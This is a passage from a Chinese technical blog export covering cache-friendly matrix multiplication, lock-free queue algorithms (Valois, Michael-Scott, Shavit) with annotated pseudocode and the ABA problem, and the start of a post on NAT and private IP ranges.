class="type">k</span>] * B[<span class="type">k</span>][<span class="type">j</span>]</span><br><span class="line"><span class="comment"># 迭代2：</span></span><br><span class="line"><span class="comment"># 通过交换j和k的循环顺序，使得A[i][k]和B[k][j]在下次计算时均会触发缓存命中过程。</span></span><br><span class="line">MatrixMulti(A[<span class="type">n</span>][<span class="type">m</span>], B[<span class="type">m</span>][<span class="type">p</span>])</span><br><span class="line">    C[<span class="type">n</span>][<span class="type">p</span>]: array，=empty</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span> to n</span><br><span class="line">        <span class="keyword">for</span> k=<span class="number">1</span> to m</span><br><span class="line">            <span class="keyword">for</span> j=<span class="number">1</span> to p</span><br><span class="line">                C[<span class="type">i</span>][<span class="type">j</span>] += A[<span class="type">i</span>][<span class="type">k</span>] * B[<span class="type">k</span>][<span class="type">j</span>]</span><br><span class="line"><span class="comment"># 迭代3：</span></span><br><span class="line"><span class="comment"># 通过临时变量，使得最后的计算过程与A矩阵不再相关，只要在缓存中读命中B以及读写命中C即可。</span></span><br><span class="line">MatrixMulti(A[<span class="type">n</span>][<span class="type">m</span>], B[<span class="type">m</span>][<span class="type">p</span>])</span><br><span class="line">    C[<span class="type">n</span>][<span class="type">p</span>]: array，=empty</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span> to n</span><br><span class="line">        <span class="keyword">for</span> k=<span class="number">1</span> to m</span><br><span class="line">            temp: =A[<span class="type">i</span>][<span class="type">k</span>]</span><br><span class="line">            <span class="keyword">for</span> j=<span class="number">1</span> to p</span><br><span class="line">                C[<span class="type">i</span>][<span class="type">j</span>] += temp * B[<span class="type">k</span>][<span class="type">j</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>时间局部性优化：大矩阵被均匀地分成子矩阵后，尽可能的连续访问同一个子矩阵；</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 迭代4：</span></span><br><span class="line">MatrixMulti(A[<span class="type">n</span>][<span class="type">m</span>], B[<span class="type">m</span>][<span class="type">p</span>])</span><br><span class="line">    C[<span class="type">n</span>][<span class="type">p</span>]: array，=empty</span><br><span class="line">    b: int, size of blocks</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">ii</span>=<span class="number">1</span>:+b to n</span><br><span class="line">        <span class="keyword">for</span> kk=<span class="number">1</span>:+b to m</span><br><span class="line">            <span class="keyword">for</span> jj=<span class="number">1</span>:+b to p</span><br><span class="line">                <span class="keyword">for</span> i=<span class="built_in">ii</span> to min(<span class="built_in">ii</span>+b, n)</span><br><span class="line">                    <span class="keyword">for</span> k=kk to min(kk+b, m)</span><br><span class="line">                        <span class="keyword">for</span> j=jj to min(jj+b, p)</span><br><span class="line">                            C[<span class="type">i</span>][<span class="type">j</span>] += A[<span class="type">i</span>][<span class="type">k</span>] * B[<span class="type">k</span>][<span class="type">j</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://en.wikipedia.org/wiki/Locality_of_reference">https://en.wikipedia.org/wiki/Locality_of_reference</a><br>[2] <a href="https://www.geeksforgeeks.org/locality-of-reference-and-cache-operation-in-cache-memory/">https://www.geeksforgeeks.org/locality-of-reference-and-cache-operation-in-cache-memory/</a></p>
]]></content>
      <categories>
        <category>Multiprocessor</category>
      </categories>
      <tags>
        <tag>LocalityPrinciple</tag>
      </tags>
  </entry>
  <entry>
    <title>无锁队列</title>
    <url>/Multiprocessor/LockFreeQueue.html</url>
    <content><![CDATA[<p>无锁队列（Lock-Free Queue）在并行场景中用于缓存消息，为尽可能高效的利用多处理器而设计。</p>
<span id="more"></span>

<h1 id="无锁数据结构"><a href="#无锁数据结构" class="headerlink" title="无锁数据结构"></a>无锁数据结构</h1><h2 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h2><ul>
<li>有锁（lock-based）的数据结构属性:<ul>
<li>阻塞（blocking)：拥有锁的处理器会无期限的延迟后续所有的操作；</li>
</ul>
</li>
<li>无锁（lock-free）的数据结构属性：<ul>
<li>非阻塞（non-blocking）：至少有一个处理器执行有限步骤的操作（数据结构一直是可访问的，尽管有时会很慢）；</li>
<li>非等待（wait-free）：每个处理器都会经过有限步骤完成它的操作（不会存在处理器被饿死的情况）；</li>
</ul>
</li>
</ul>
<h2 id="CPU指令"><a href="#CPU指令" class="headerlink" title="CPU指令"></a>CPU指令</h2><ul>
<li>read-modify-write语义:<ul>
<li>Fetch&amp;Add (FAA)：从内存读值后，加上另一个值，写回到原内存位置，并返回内存原始的值；</li>
<li>Compare&amp;Swap (CSW&#x2F;CAS)：从内存读取当前值（current）后，如果当前值等于旧值（old），就把新值（new）写回到内存位置，并返回标记表示当前值是否被修改了。<br>                ismodify&#x3D;CAS(current, old, new)</li>
</ul>
</li>
</ul>
<h2 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h2><p>在多线程计算中，ABA问题是指当一个内存位置被P1线程读取了两次，如果两次读到的值都是A，P1线程会认为这块内存从未改变过。然而在P1线程的两次读之间，可能会有P2线程将该内存位置的值先改变为B后又改变为A，因此可看成P1线程被P2线程“欺骗”了而引起的问题。</p>
<p>在无锁数据结构中，因为CAS指令只保证了内存地址不变时就更新值，如果删除了一个节点N1后又新增了一个节点N2，N2因为MRU(Most recently used)内存分配策略复用了N1的内存地址，所以N1和N2会被当作同一个节点对待而产生ABA问题。</p>
<p>解决方法：</p>
<ol>
<li>使用double-compare-and-swap(DCAS)指令：支持一次操作两个位置，一个用于存储节点，另一个用于存储标记（每次节点变化都会增加）。</li>
<li>优化内存管理机制：使用引用计数避免内存在使用过程中被释放后重用的情况。</li>
<li>引入节点唯一属性：通过此属性区分内存重用的两个节点。</li>
</ol>
<h1 id="无锁队列"><a href="#无锁队列" class="headerlink" title="无锁队列"></a>无锁队列</h1><h2 id="Valois算法"><a href="#Valois算法" class="headerlink" title="Valois算法"></a>Valois算法</h2><p><a href="https://www.semanticscholar.org/paper/Implementing-Lock-Free-Queues-Valois/a9091ef790788c5d252cad94dd6862adf457e073">Implementing Lock-Free Queues, John D. Valois, Department of Computer Science Rensselaer Polytechnic Institute Troy, NY 12180, 1994</a></p>
<ul>
<li>单链表实现：<ul>
<li>优点：<ol>
<li>使用一个dummy节点，既避免出现queue为空或者只有一个节点的情况，又消除了入队和出队操作对一个节点的争用情况；</li>
<li>提出使用引用计数优化内存管理机制解决ABA问题的策略：拷贝节点时增加引用计数，释放副本时减少引用计数，引用计数为0时销毁节点。</li>
<li>这个算法满足non-blocking属性，不满足wait-free属性。</li>
</ol>
</li>
<li>缺点：<ol>
<li>这个算法允许tail滞后于head，因此会影响出队时安全地释放节点（尾指针还在引用节点，引用计数不为0）或者出现重用出队的节点情况。如果tail访问了已经出队的节点，进程会崩溃。</li>
<li>如果一个线程读取一个节点（增加了引用计数）后延迟或异常终止了，其他线程可以继续入队和出队任意数量的节点，那么这个节点以及后续的所有节点的内存都无法释放。</li>
</ol>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="valoislinkedimpl"><ul class="nav-tabs"><li class="tab active"><a href="#valoislinkedimpl-1">Singlylinked</a></li></ul><div class="tab-content"><div class="tab-pane active" id="valoislinkedimpl-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">SLNode</span><br><span class="line">    value: element</span><br><span class="line">    next: SLNode</span><br><span class="line">LFQueue</span><br><span class="line">    head: SLNode, =dummyNode <span class="comment"># 初始指向虚拟节点</span></span><br><span class="line">    tail: SLNode, =dummyNode <span class="comment"># 初始指向虚拟节点</span></span><br><span class="line">    <span class="comment"># 入队（重试策略-优：tail节点总是指向尾部或者紧挨着尾部的节点）</span></span><br><span class="line">    Enqueue(e)</span><br><span class="line">        q: SLNode, =&#123;e, nul&#125;</span><br><span class="line">        p: SLNode, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 当tail实际指向尾部时，将新节点插入到tail之后。</span></span><br><span class="line">            p = tail</span><br><span class="line">            <span class="comment"># 此时其他线程插入了新节点，p就不是实际尾部了。</span></span><br><span class="line">            succ: =CAS(p.next, nul, q)</span><br><span class="line">            <span class="keyword">if</span> succ.false</span><br><span class="line">                <span class="comment"># tail未指向尾部，就向尾部移动一次。</span></span><br><span class="line">                CAS(tail, p, p.next)</span><br><span class="line">        <span class="keyword">until</span> succ.true</span><br><span class="line">        <span class="comment"># 将tail指向新的尾部节点</span></span><br><span class="line">        CAS(tail, p, q)</span><br><span class="line">    <span class="comment"># 入队2（重试策略-劣：将tail节点看作指向尾部的提示，指向一个非常接近尾部的节点）</span></span><br><span class="line">    Enqueue2(e)</span><br><span class="line">        q: SLNode, =&#123;e, nul&#125;</span><br><span class="line">        p: SLNode, =tail</span><br><span class="line">        oldp: SLNode, =p</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 寻找最接近尾部的节点（入队频繁时，此处遍历操作耗时过多）</span></span><br><span class="line">            <span class="keyword">while</span> p.next != nul</span><br><span class="line">                p = p.next</span><br><span class="line">            <span class="comment"># 在寻找到的节点后面尝试插入新节点</span></span><br><span class="line">        <span class="keyword">until</span> true == CAS(p.next, nul, q)</span><br><span class="line">        <span class="comment"># 将tail指向新的尾部节点</span></span><br><span class="line">        CAS(tail, oldp, q)</span><br><span class="line">    <span class="comment"># 入队3（重试策略-缺陷：只有在插入新节点时才会更新tail节点）</span></span><br><span class="line">    Enqueue(e)</span><br><span class="line">        q: SLNode, =&#123;e, nul&#125;</span><br><span class="line">        p: SLNode, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 一直等待其他线程完成入队，使得tail实际指向尾部</span></span><br><span class="line">            <span class="comment"># 缺陷：这种策略虽然执行很快，但当出现某个线程插入了新节点且未更新tail就终止时，</span></span><br><span class="line">            <span class="comment">#       所有入队操作会陷入死循环，也即破坏了non-blocking属性。</span></span><br><span class="line">            <span class="comment"># 修复：记录CAS失败次数，达到阈值后查找尾部并更新tail节点（违背了重试策略）。</span></span><br><span class="line">            p = tail</span><br><span class="line">        <span class="keyword">until</span> true == CAS(p.next, nul, q)</span><br><span class="line">        <span class="comment"># 将tail指向新的尾部节点</span></span><br><span class="line">        CAS(tail, p, q)</span><br><span class="line">    <span class="comment"># 出队</span></span><br><span class="line">    Dequeue()</span><br><span class="line">        p: SLNode, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 当head实际指向头部时，将头部更新到下一个节点即完成出队。</span></span><br><span class="line">            p = head</span><br><span class="line">            <span class="keyword">if</span> p.next == nul</span><br><span class="line">                error queue empty</span><br><span class="line">            <span class="comment"># 此时其他线程出队了节点，当前线程的head就向尾部移动一次。</span></span><br><span class="line">            <span class="comment"># ABA问题：此时其他线程出队了节点N1后又入队了新节点N2，N2复用了N1内存地址</span></span><br><span class="line">            <span class="comment">#          且N2为头部节点，当前线程的CAS应该失败，但实际是成功的。</span></span><br><span class="line">            <span class="comment"># 修复：内存管理上使用引用计数后，即使其他线程已经将N1出队了，</span></span><br><span class="line">            <span class="comment">#       由于当前线程还在使用N1节点，N1的内存也不会回收。</span></span><br><span class="line">        <span class="keyword">until</span> true == CAS(head, p, p.next)</span><br><span class="line">        <span class="keyword">return</span> p.next.value</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Scott算法"><a href="#Scott算法" class="headerlink" title="Scott算法"></a>Scott算法</h2><p><a href="https://www.cs.rochester.edu/~scott/papers/1996_PODC_queues.pdf">Simple, Fast, and Practical Non-Blocking and Blocking Concurrent Queue Algorithms, by Maged M. Michael and Michael L. Scott, 1996</a><br><a href="https://www.cs.rochester.edu/u/scott/papers/1998_JPDC_nonblocking.pdf">Nonblocking Algorithms and Preemption-Safe Locking on Multiprogrammed Shared Memory Multiprocessors, by Maged M. Michael and Michael L. Scott, 1998</a><br><a href="https://www.cs.rochester.edu/research/systems/high_performance_synch/">High-Performance Synchronization for Shared-Memory Parallel Programs, University of Rochester</a></p>
<ul>
<li>单向链表实现：<ol>
<li>（同Valois算法）使用一个dummy节点、tail节点总是指向尾部或者紧挨着尾部的节点、满足non-blocking属性而不满足wait-free属性；</li>
<li>避免出现tail滞后于head的情况：每次出队都会比较head和tail节点，如果tail落后于尾节点就移动它，确保只在tail位于head后面时才会出队；</li>
<li>避免ABA问题：入队时为每个节点分配唯一的流水号，tail节点的计数即为入队的节点总数量，head节点的计数为出队的节点总数量，即使重用了节点内存，也能根据流水号区分节点。</li>
</ol>
<ul>
<li>应用：<ul>
<li><a href="https://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ConcurrentLinkedQueue.html">java.util.concurrent.ConcurrentLinkedQueue</a>&#x2F;JSR 166时采用，在JDK 1.5.0集成到Java标准库中。</li>
<li><a href="https://bitbucket.org/marwan_burelle/lockfreeexperiment/src/master/LockFreeQuee/lock_free_queue.hh">C++11 Lock Free Queue based on Micheal&amp;Scott</a> Marwan Burelle，<a href="https://blog.lse.epita.fr/categories/">System Laboratory of EPITA</a>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="scottlinkedimpl"><ul class="nav-tabs"><li class="tab active"><a href="#scottlinkedimpl-1">Singlylinked</a></li></ul><div class="tab-content"><div class="tab-pane active" id="scottlinkedimpl-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">SLPointer</span><br><span class="line">    ptr: SLNode  <span class="comment"># 只有尾节点的Tail.next.ptr为nul，其他情况均不会为nul。</span></span><br><span class="line">        value: element</span><br><span class="line">        next: SLPointer <span class="comment"># 此对象一直存在，不会出现nul的情况</span></span><br><span class="line">    count: countOfNode  <span class="comment"># 节点计数：唯一属性，用于解决ABA问题</span></span><br><span class="line">LFQueue</span><br><span class="line">    dummy: SLNode, =&#123;value:x, next:&#123;ptr:nul, count:<span class="number">0</span>&#125;&#125; <span class="comment"># 虚拟节点：ptr=nul</span></span><br><span class="line">    head: SLPointer, =&#123;ptr:dummy, count:<span class="number">0</span>&#125; <span class="comment"># 初始为虚拟节点，后续一直指向头节点</span></span><br><span class="line">    tail: SLPointer, =&#123;ptr:dummy, count:<span class="number">0</span>&#125; <span class="comment"># 初始为虚拟节点，后续指向尾节点或倒数第二个节点</span></span><br><span class="line">    <span class="comment"># 入队</span></span><br><span class="line">    Enqueue(e)</span><br><span class="line">        q: SLNode, =&#123;value:e, next:&#123;ptr:nul, count:<span class="number">0</span>&#125;&#125; <span class="comment"># 分配SLNode</span></span><br><span class="line">        p,s: SLPointer, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 获取尾节点相关的两个SLPointer对象：</span></span><br><span class="line">            <span class="comment"># 1.p对应尾节点本身；</span></span><br><span class="line">            <span class="comment"># 2.s对应尾节点之后的节点，相当于为新节点预先分配了SLPointer对象。</span></span><br><span class="line">            p = tail</span><br><span class="line">            s = p.ptr.next</span><br><span class="line">            <span class="comment"># 此时其他线程入队了新节点，即tail被其他线程修改了。</span></span><br><span class="line">            <span class="keyword">if</span> p == tail</span><br><span class="line">                <span class="comment"># tail实际指向尾节点时，tail.next.ptr应为nul</span></span><br><span class="line">                <span class="keyword">if</span> s.ptr == nul</span><br><span class="line">                    <span class="comment"># 尝试将新节点q插入到尾部，并基于预分配的值增加引用计数</span></span><br><span class="line">                    <span class="keyword">if</span> CAS(p.ptr.next, s, &#123;q, s.count+<span class="number">1</span>&#125;)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment"># tail未指向尾节点，就向尾部移动一次，并基于当前尾节点的值增加引用计数。</span></span><br><span class="line">                    CAS(tail, p, &#123;s.ptr, p.count+<span class="number">1</span>&#125;)</span><br><span class="line">        <span class="comment"># 更新tail指向新的尾节点，并基于当前尾节点的值增加引用计数</span></span><br><span class="line">        CAS(tail, p, &#123;q, p.count+<span class="number">1</span>&#125;)</span><br><span class="line">    <span class="comment"># 出队</span></span><br><span class="line">    Dequeue()</span><br><span class="line">        e: element</span><br><span class="line">        p,s,t: SLPointer, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 获取头节点相关的两个SLPointer对象，以及尾节点对应的SLPointer</span></span><br><span class="line">            p = head</span><br><span class="line">            s = p.ptr.next</span><br><span class="line">            t = tail</span><br><span class="line">            <span class="comment"># 此时其他线程出队了节点，即head被其他线程修改了。</span></span><br><span class="line">            <span class="keyword">if</span> p == head</span><br><span class="line">                <span class="comment"># 头节点和尾节点指向同一节点的两种情况：</span></span><br><span class="line">                <span class="comment"># 1.队列为空时都指向dummy节点，此时s.ptr为nul；</span></span><br><span class="line">                <span class="comment"># 2.tail落后于尾节点且head追上了tail，此时s.ptr指向尾节点。</span></span><br><span class="line">                <span class="keyword">if</span> p.ptr == t.ptr</span><br><span class="line">                    <span class="comment"># 队列为空时，不允许出队。</span></span><br><span class="line">                    <span class="keyword">if</span> s.ptr == nul</span><br><span class="line">                        <span class="keyword">return</span> nul</span><br><span class="line">                    <span class="comment"># tail落后了，就向尾部移动一次，并基于当前尾节点的值增加引用计数。</span></span><br><span class="line">                    CAS(tail, t, &#123;s.ptr, t.count+<span class="number">1</span>&#125;)</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment"># 必须在CAS前取值，否则另一个线程出队了节点后可能释放了s节点</span></span><br><span class="line">                    e = s.ptr-&gt;value</span><br><span class="line">                    <span class="comment"># 尝试切换head到下一个节点，并基于当前头节点的值增加引用计数。</span></span><br><span class="line">                    <span class="keyword">if</span> CAS(head, p, &#123;s, p.count+<span class="number">1</span>&#125;)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 释放老的头节点</span></span><br><span class="line">        free(p.ptr)</span><br><span class="line">        <span class="keyword">return</span> e</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Shavit算法"><a href="#Shavit算法" class="headerlink" title="Shavit算法"></a>Shavit算法</h2><p><a href="http://people.csail.mit.edu/shanir/publications/FIFO_Queues.pdf">An Optimistic Approach to Lock-Free FIFO Queues, Edya Ladan-Mozes and Nir Shavit, Distributed Computing, 20(5):323-341, 2008</a><br><a href="https://people.csail.mit.edu/shanir/"><em>The Art of Multiprocessor Programming</em>, Nir Shavit</a></p>
<ul>
<li>双向链表实现：<ol>
<li>（同Scott算法）使用一个dummy节点、使用流水号解决ABA问题、满足non-blocking属性而不满足wait-free属性；</li>
<li>（相对于Scott算法）反转入队和出队的方向，使得入队时减少了一次CAS调用，同时降低了CAS操作失败的几率（CAS操作需要独占CPU所有权和刷新写缓冲区，其耗时比加载或存储要长一个数量级）；</li>
<li>（相对于Scott算法）反转方向后，需要引入prev建立head到tail方向的节点关系，在prev关系异常时要根据next的关系进行修复。</li>
</ol>
</li>
</ul>
<div class="tabs" id="shavitlinkedimpl"><ul class="nav-tabs"><li class="tab active"><a href="#shavitlinkedimpl-1">Doublylinked</a></li></ul><div class="tab-content"><div class="tab-pane active" id="shavitlinkedimpl-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">DLPointer</span><br><span class="line">    ptr: DLNode  <span class="comment"># 只有Tail.prev.ptr和Head.next.ptr为nul，其他情况均不会为nul。</span></span><br><span class="line">        value: element</span><br><span class="line">        next: DLPointer <span class="comment"># 此对象非null，无需考虑内存复用引起的ABA问题</span></span><br><span class="line">        prev: DLPointer <span class="comment"># 此对象非null，无需考虑内存复用引起的ABA问题</span></span><br><span class="line">    tag: countOfNode    <span class="comment"># 节点计数：唯一属性，用于解决ABA问题，满足如下规则：</span></span><br><span class="line">         <span class="comment"># 1.从tail-&gt;head通过next遍历队列，tag值依次减少，tail.tag=tail.next.tag为入队的总节点数量</span></span><br><span class="line">         <span class="comment"># 2.从head-&gt;tail通过prev遍历队列，tag值依次增加，head.tag=head.prev.tag为出队的总节点数量</span></span><br><span class="line">         <span class="comment"># 3.每个节点DLNode，满足next.tag==prev.tag。</span></span><br><span class="line">DFQueue</span><br><span class="line">    evl: element, =xxx <span class="comment"># 预定义值</span></span><br><span class="line">    dummy: DLNode, =&#123;value:evl, next:&#123;ptr:nul, tag:<span class="number">0</span>&#125;, prev:&#123;ptr:nul, tag:<span class="number">0</span>&#125;&#125; <span class="comment"># 虚拟节点：ptr=nul</span></span><br><span class="line">    head: DLPointer, =&#123;ptr:dummy, tag:<span class="number">0</span>&#125; <span class="comment"># 指向最年老的节点</span></span><br><span class="line">    tail: DLPointer, =&#123;ptr:dummy, tag:<span class="number">0</span>&#125; <span class="comment"># 指向最年轻的节点</span></span><br><span class="line">    <span class="comment"># 入队</span></span><br><span class="line">    Enqueue(e)</span><br><span class="line">        q: SLNode, =&#123;value:e, next:&#123;ptr:nul, tag:<span class="number">0</span>&#125;, prev:&#123;ptr:nul, tag:<span class="number">0</span>&#125;&#125; <span class="comment"># 分配SLNode</span></span><br><span class="line">        p: SLPointer, =nul</span><br><span class="line">        loop</span><br><span class="line">            p = tail</span><br><span class="line">            <span class="comment"># 新节点的next指向尾节点即插入队列（头尾是反转的）</span></span><br><span class="line">            q.next = &#123;p.ptr, p.tag+<span class="number">1</span>&#125;;</span><br><span class="line">            <span class="comment"># 尝试切换tail节点为新插入节点，并基于当前尾节点的值增加引用计数</span></span><br><span class="line">            <span class="comment"># （此时其他线程入队节点或将Tail节点出队，CAS将失败，尝试下一次入队）</span></span><br><span class="line">            <span class="keyword">if</span> CAS(tail, p, &#123;q, p.tag+<span class="number">1</span>&#125;)</span><br><span class="line">                <span class="comment"># 建立prev关系（此时其他线程出队节点，会遇到head.prev=nul的情况，因此要通过FixList修复链表）</span></span><br><span class="line">                p.ptr.prev = &#123;q, p.tag&#125;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 出队</span></span><br><span class="line">    Dequeue()</span><br><span class="line">        e: element</span><br><span class="line">        d: DLNode，as dummy</span><br><span class="line">        p,s,t: SLPointer, =nul</span><br><span class="line">        loop</span><br><span class="line">            <span class="comment"># 获取头节点相关的两个SLPointer对象，以及尾节点对应的SLPointer</span></span><br><span class="line">            p = head</span><br><span class="line">            s = p.ptr.prev</span><br><span class="line">            e = p.ptr.value</span><br><span class="line">            t = tail</span><br><span class="line">            <span class="comment"># 此时其他线程出队了节点，即head被其他线程修改了。</span></span><br><span class="line">            <span class="keyword">if</span> p == head</span><br><span class="line">                <span class="comment"># 当前出队的是dummy节点</span></span><br><span class="line">                <span class="keyword">if</span> e == evl</span><br><span class="line">                    <span class="comment"># 队列为空时（头&amp;尾都指向dummy节点）</span></span><br><span class="line">                    <span class="keyword">if</span> p.ptr == t.ptr</span><br><span class="line">                        <span class="keyword">return</span> nul</span><br><span class="line">                    <span class="comment"># tag异常，说明需要修复链表prev关系</span></span><br><span class="line">                    <span class="keyword">if</span> p.tag != s.tag</span><br><span class="line">                        FixList(t, p)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="comment"># 略过dummy节点，并基于当前头节点的值增加引用计数。</span></span><br><span class="line">                    CAS(head, p, &#123;s.ptr, p.tag+<span class="number">1</span>&#125;)</span><br><span class="line">                <span class="comment"># 当前出队的不是dummy节点</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment"># 队列中只有一个非dummy节点</span></span><br><span class="line">                    <span class="keyword">if</span> p == t</span><br><span class="line">                        <span class="comment"># 入队一个dummy节点后才能出队（队列不能为空）</span></span><br><span class="line">                        d = &#123;value:evl, next:&#123;t.ptr, t.tag+<span class="number">1</span>&#125;, prev:&#123;ptr:nul, tag:<span class="number">0</span>&#125;&#125;</span><br><span class="line">                        <span class="keyword">if</span> CAS(tail, t, &#123;d, t.tag+<span class="number">1</span>&#125;)</span><br><span class="line">                            <span class="comment"># 入队dummy节点成功后，建立prev关系</span></span><br><span class="line">                            t.ptr.prev = &#123;d, t.tag&#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="comment"># 入队dummy节点失败，说明其他线程已经入队了新节点，就释放它</span></span><br><span class="line">                            free(d)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="comment"># 队列中至少有两个节点且head节点不是dummy节点</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="comment"># tag异常，说明需要修复链表prev关系</span></span><br><span class="line">                        <span class="keyword">if</span> p.tag != s.tag</span><br><span class="line">                            FixList(t, p)</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    <span class="comment"># 更新头节点，并基于当前头节点的值增加引用计数。</span></span><br><span class="line">                    <span class="keyword">if</span> CAS(head, p, &#123;s.ptr, p.tag+<span class="number">1</span>&#125;)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 释放老的头节点</span></span><br><span class="line">        free(p.ptr)</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line">    <span class="comment"># 修复链表</span></span><br><span class="line">    FixList(t:Tail, p:Head)</span><br><span class="line">        <span class="comment"># 1. 只应在出队时修复链表，必须包括头节点。</span></span><br><span class="line">        <span class="comment"># 2. 根据next的节点关系修复prev。</span></span><br><span class="line">        c,x,s: DLPointer, c=t</span><br><span class="line">        <span class="keyword">while</span> p == head &amp;&amp; c != p</span><br><span class="line">            x = c.ptr.next</span><br><span class="line">            <span class="keyword">if</span> x.tag != c.tag</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            s = x.ptr.prev</span><br><span class="line">            <span class="keyword">if</span> s != &#123;c.ptr, c.tag&#125;</span><br><span class="line">                x.ptr.prev = &#123;c.ptr, c.tag&#125;</span><br><span class="line">            c = &#123;x.ptr, c.tag&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Petrank算法"><a href="#Petrank算法" class="headerlink" title="Petrank算法"></a>Petrank算法</h2><p><a href="http://www.cs.technion.ac.il/~erez/Papers/wfquque-ppopp.pdf">Wait-Free Queues With Multiple Enqueuers and Dequeuers, Alex Kogan and Erez Petrank, 2011</a><br><a href="https://www.cs.technion.ac.il/~erez/Papers/wf-methodology-ppopp12.pdf">A Methodology for Creating Fast Wait-Free Data Structures, Alex Kogan and Erez Petrank, 2012</a><br><a href="https://www.cs.technion.ac.il/~erez/Papers/wfll.pdf">Wait-Free Linked-Lists, Shahar Timnat, Anastasia Braginsky, Alex Kogan, and Erez Petrank, 2012</a><br><a href="https://www.cs.technion.ac.il/~erez/Papers/wf-simulation-ppopp14.pdf">A Practical Wait-Free Simulation for Lock-Free Data Structures, Shahar Timnat and Erez Petrank, 2014</a></p>
<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p><a href="https://www.boost.org/doc/libs/1_53_0/doc/html/boost/lockfree/queue.html">boost 1.53.0 - lock-free queue</a><br><a href="https://github.com/facebook/folly/blob/master/folly/docs/ProducerConsumerQueue.md">Facebook&#x2F;Folly - ProducerConsumerQueue</a><br><a href="https://github.com/facebook/folly/blob/master/folly/docs/AtomicHashMap.md">Facebook&#x2F;Folly - AtomicHashMap</a><br><a href="https://github.com/cameron314/readerwriterqueue.git">Cameron - A single-producer, single-consumer lock-free queue for C++</a><br><a href="https://github.com/cameron314/concurrentqueue.git">Cameron - An industrial-strength lock-free queue for C++</a></p>
<h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><p>[1] <a href="https://stackoverflow.com/questions/1164023/is-there-a-production-ready-lock-free-queue-or-hash-implementation-in-c">is-there-a-production-ready-lock-free-queue-or-hash-implementation-in-c</a></p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Multiprocessor</category>
      </categories>
      <tags>
        <tag>LockFreeQueue</tag>
      </tags>
  </entry>
  <entry>
    <title>网络地址转换与穿越</title>
    <url>/Network/NAT.html</url>
    <content><![CDATA[<p><code>Network address translation (NAT)</code> 是指当数据包经过路由设备时，通过修改IP包头中的网络地址信息，将一个IP地址空间映射到另一个IP地址空间的方法。最初用于更换上游 Internet service provider 时，避免重新分配网络中每个主机的地址，后来在面对IPv4地址耗尽问题时变成一种流行而必要的工具。</p>
<span id="more"></span>

<p><img data-src="/images/Network/Network-Address-Translation.png"></p>
<h1 id="私网地址"><a href="#私网地址" class="headerlink" title="私网地址"></a>私网地址</h1><p><a href="https://www.rfc-editor.org/rfc/rfc1918">RFC1918 Address Allocation for Private Internets (1996)</a></p>
<p>   The Internet Assigned Numbers Authority (IANA) has reserved the<br>   following three blocks of the IP address space for private internets:</p>
<pre><code> 10.0.0.0        -   10.255.255.255  (10/8 prefix)
 172.16.0.0      -   172.31.255.255  (172.16/12 prefix)
 192.168.0.0     -   192.168.255.255 (192.168/16 prefix)
</code></pre>
<h1 id="NAT应用场景"><a href="#NAT应用场景" class="headerlink" title="NAT应用场景"></a>NAT应用场景</h1><ul>
<li>需要连接到因特网，但主机没有全局唯一的IP地址；</li>
<li>更换的ISP要求对网络进行重新编址；</li>
<li>需要合并两个使用相同编址方案的内联网；</li>
</ul>
<table>
<thead>
<tr>
<th align="left">优点</th>
<th align="left">缺点</th>
</tr>
</thead>
<tbody><tr>
<td align="left">节省合法的注册地址</td>
<td align="left">地址转换将增加交换延迟</td>
</tr>
<tr>
<td align="left">在地址重叠或网络发生变化时避免重新编址</td>
<td align="left">导致无法进行端到端的IP跟踪</td>
</tr>
<tr>
<td align="left">提高连接到因特网的灵活性</td>
<td align="left">导致有些应用程序无法正常运行</td>
</tr>
</tbody></table>
<h1 id="NAT设备特征"><a href="#NAT设备特征" class="headerlink" title="NAT设备特征"></a>NAT设备特征</h1><ul>
<li><em>透明的地址分配</em>：<ul>
<li>静态地址分配：在私网地址和外部地址之间进行一对一的映射。使用时必须为私网中的每台主机提供一个外部IP地址；</li>
